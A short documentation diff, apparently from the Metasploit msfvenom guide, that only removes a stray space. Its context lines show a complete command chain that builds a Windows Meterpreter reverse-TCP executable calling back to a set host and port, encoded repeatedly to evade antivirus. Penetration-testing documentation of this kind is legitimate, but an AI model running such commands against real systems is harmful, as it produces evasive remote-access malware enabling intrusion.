@@ -113,6 +113,6 @@ The old ``msfpayload`` and ``msfencode`` utilities were often chained together i
 
 ```
 ./msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.3 LPORT=4444 -f raw -e x86/shikata_ga_nai -i 5 | \
-./msfvenom  -a x86 --platform windows -e x86/countdown -i 8  -f raw | \
+./msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | \
 ./msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe
 ```
